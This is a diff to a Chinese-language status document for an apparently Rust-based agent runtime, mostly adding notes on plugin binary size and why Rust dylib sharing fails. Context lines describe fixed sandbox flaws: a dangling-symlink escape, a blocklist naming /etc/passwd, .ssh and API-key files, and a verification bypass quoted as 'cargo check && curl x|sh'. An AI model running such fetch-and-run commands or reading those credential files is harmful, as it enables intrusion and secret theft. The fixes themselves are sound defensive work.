@@ -2,7 +2,7 @@
 
 ## 1. 判定口径
 
-- 本文基于当前仓库现状整理，最近更新：2026-08-10。
+- 本文基于当前仓库现状整理，最近更新：2026-11-18。
 - 历史规划蓝图已经吸收进 [design-blueprint.md](./design-blueprint.md)，因此本文结论来自三类证据的交叉比对：
   - 设计蓝图：[design-blueprint.md](./design-blueprint.md)
   - 架构文档：[system-overview.md](./system-overview.md)、[contracts-and-loading.md](./contracts-and-loading.md)、[runtime-semantics.md](./runtime-semantics.md)、[maintenance-guide.md](./maintenance-guide.md)
@@ -244,6 +244,74 @@ Agent 现在可以自主完成：读代码 → 理解结构 → 写/改文件 �
 - [x] **`resolve_sandboxed_path` 悬空 symlink 逃逸** — 原实现只对"最近已存在祖先"做 canonicalize 校验，最终分量若是悬空 symlink（目标不存在或指向 root 外）即放行，调用方 `fs::write` 会跟随链接在沙箱外创建/覆写文件。现在：最终分量存在时对完整 resolved 路径 canonicalize 校验包含性；最终分量是 symlink 时解析其目标（read_link + canonicalize，相对目标按链接父目录拼接）并要求目标在 root 内；悬空链接直接拒绝（`path is a dangling symlink: <rel>`）。指向 root 内的 symlink 仍允许（原有语义）。`crates/cordis-runtime/src/host.rs::resolve_sandboxed_path`。回归测试见 `tests/host_boot_session_arms.rs`（dangling-abs / dangling-rel / inside-link / inside-abs / ext-link）。
 - [x] **敏感路径/命令子串黑名单绕过** — 原 `lower.contains(kw)` 子串匹配被 `/etc//passwd`、`/proc//self`、`apikey` / `api-key` 等变体绕过。`check_sensitive_path` 先做纯词法路径规范化（折叠重复 `/`、去尾部 `/`、词法解析 `.`/`..`，不做 fs 操作），再按组件链匹配 `etc/passwd`、`etc/shadow`，按根级组件边界匹配 `proc`/`sys`，按组件前缀匹配 `.ssh`/`.env`/`id_rsa`/`credentials`/`auth.json` 等，并对 `access_token`/`api_key`/`api_secret`/`private_key` 做 `-`、` ` → `_` 归一化（含去下划线紧凑形，拦截 `api-key`/`apikey` 变体）；归一化只作用于这些关键词，`plugins/x/api-utils.rs` 不误伤。`check_sensitive_command` 保留原始子串检查，另加 argv token 级路径门（shell_words 分词，形如路径的 token 跑敏感路径匹配，拦 `head /etc/passwd`、`cat /etc//shadow`、`~/.ssh/` 访问）与 shell 解释器拦截（argv[0] ∈ {sh,bash,dash,ksh,zsh,fish} 且含 `-c`/`-lc`/`--command` → `blocked: shell interpreter invocation`）。
 - [x] **Plugin-iteration 验证命令去 shell**（对齐 P0-17）— `validated_verification_command` 的 `trimmed.starts_with(required_prefix)` 前缀白名单可被 `cargo check && curl x|sh` 绕过，默认命令 `format!("… -p {pp}")` 把 LLM 可控的 plugin_path 拼进 `bash -lc` 字符串。现在：新增共享 argv 门 `validate_verification_argv`（`shell_words::split` 分词、`argv[0]=="cargo"`、`argv[1]` 为所需 op、任何 argv 元素含 `; & | \` $ < > 换行` 即拒），`run_checked_command` 不再经 shell，直接 `Command::new("cargo").args(...)`；默认命令改为 argv 构造 `verification_default_command`，plugin_path 经 `verification_package_segment` 校验（剥离前缀 `/`、拒绝空、拒绝白名单外字符与 `..`，失败返回 InvalidArgument）后作为独立 `["-p", pp]` argv 元素追加；裸别名 `check`/`test` 仍映射到默认 argv。错误文本保持逐字节兼容（`verification tool only allows commands starting with …`）。
+
+### 5.2.41b 插件工件按 size 优化编译；Rust dylib 共享此路不通（2026-08-07；编号与 5.2.41 host.rs 条目重复，故加 b 后缀）
+
+**背景**：5.2.40 补齐 strip 后工件仍有 142 MB，dlopen 时全部进内存。
+
+#### 已落地：`opt-level = "z"`
+
+工件此前是**无优化**的 dev 构建——没有内联、没有死代码消除。给 11 个
+`[profile.dev]`（父 workspace + 10 个 `exclude` 插件，后者是独立 workspace 根，
+收不到父级配置，同 5.2.40）各加 `opt-level = "z"`：
+
+| | 工件合计 | 全量构建 |
+|---|---|---|
+| 优化前 | 142 MB | 65 s |
+| 优化后 | **79 MB（−44%）** | 135 s |
+
+大插件降幅最明显：llm_openai 18.74 → 8.70、web 18.11 → 8.32、feishu 16.96 →
+7.71、qq 16.37 → 7.49、vision 12.26 → 5.96 MB。
+
+**为什么优化放 dev 档而不是切 release**：`plugin iteration` 对插件跑
+`cargo test`（dev 档）。若工件用 release，插件会被编两遍（两个 profile 各一份），
+构建时间与磁盘都翻倍。dev 档承载优化则共用一份，且 `debug_assertions` 仍开启，
+插件测试语义不变。release + strip 实测 65 MB，只比 dev+opt-level=z 小 10 MB，
+不值那份复杂度。
+
+#### 已否决：把 std / SDK / serde 做成共享 dylib
+
+动机是"22 个插件各带一份 std 与 serde"。实测结论：**共享 Rust 泛型代码不可行**，
+且原因是结构性的，不是配置问题。
+
+- **只共享 libstd 可行**：SDK 保持 rlib，插件加 `-C prefer-dynamic`，宿主以
+  `RTLD_GLOBAL` 预加载 libstd 后 22 个插件全部正常加载。但收益只有
+  142 → 126 MB（−11%），换来一整套预加载与共享目录分发机制，不成比例。
+- **共享 SDK（连带 serde）不可行**：SDK 改 `crate-type = ["rlib", "dylib"]`、
+  全部插件用同一个 `CARGO_TARGET_DIR` 构建、预加载与插件链接的**同一个**
+  SDK dylib 文件后，**22 个插件只有 3 个能加载**。19 个失败，缺的符号各不相同：
+  `core::ptr::drop_glue::<serde_json 类型>`、`alloc::slice::to_vec_in::<u8,…>`、
+  `<Result<(), serde_json::Error> as Try>::from_output`、`serde_core::de::impls::…`。
+
+**根因**：泛型在 Rust 里按实例化单态化编译。`serde_json::from_str::<T>()` 在选定
+`T` 之前不是代码；每个插件的 `#[derive(Deserialize)]` 类型生成各自的机器码。
+所以"22 份 serde 副本"是个误称——那是 **22 份不同的特化**，只在 `Cargo.toml`
+里看起来是同一个依赖。符号统计印证：llm_openai 里 serde 相关代码只有 0.35 MB。
+rustc 在上游以 dylib 形式存在时把这些实例记作"上游提供"、不在本地生成，dylib
+里没有就成了 undefined symbol；而"枚举全部插件可能用到的实例"不是有限任务。
+
+**libstd 为何例外**：由工具链构建分发，rustc 对它有特殊处理，缺的实例会在本地
+生成。这就是"共享 libstd 可行、共享用户 crate 不可行"的分界。
+
+**`dylib` 与 `cdylib`**：只有 `dylib` 能被别的 Rust crate 依赖、从而共享 Rust
+依赖，但代价正是携带元数据与上述单态化记账；`cdylib` 导出纯 C ABI、把全部
+Rust 依赖静态吞入，定义上就无法共享。**不存在"既能共享 serde 又可靠"的
+crate-type**。附带一条现状观察：本仓库插件声明的是 `dylib`，但用法是 `cdylib`
+的场景（dlopen + dlsym 取单一入口、之后只交换 JSON）；`RustPluginApiV2` 虽标
+`#[repr(C)]`，`handle` 却是 Rust ABI 的 `fn` 指针、`PluginRequest.payload` 按值
+传 `String`——这就是"宿主与插件必须同一 rustc 编译"这一隐含约束的来源，而仓库
+尚无 `rust-toolchain.toml` 锁定。
+
+#### 剩余杠杆
+
+- **`llm_openai` / `web` 从 reqwest 换 ureq**：两者用法是纯阻塞，但 reqwest 的
+  blocking 模式仍拉起 tokio 运行时，连带 hyper / hyper-rustls / hyper-util /
+  mio / tokio-rustls 共 10 个异步栈 crate（依赖数 96，而用 ureq 的 vision 是
+  63）。llm_openai 里 tokio/hyper 代码占 1.43 MB。不推翻任何既有决策。
+- **rustls → native-tls（已否决）**：rustls + ring 占 llm_openai 代码的
+  2.82 MB，是单态的密码学与协议代码，换系统 OpenSSL 可经 C ABI 在 5 个网络插件
+  与系统之间真正共享。但这推翻 `llm_openai/Cargo.toml` 里"不依赖系统 OpenSSL"
+  的既有选择，且需要构建机具备 pkg-config 与 OpenSSL 开发包。不做。
 
 ### 5.2.40 插件工件体积：exclude 清单里的插件收不到 strip profile（2026-08-06）
 
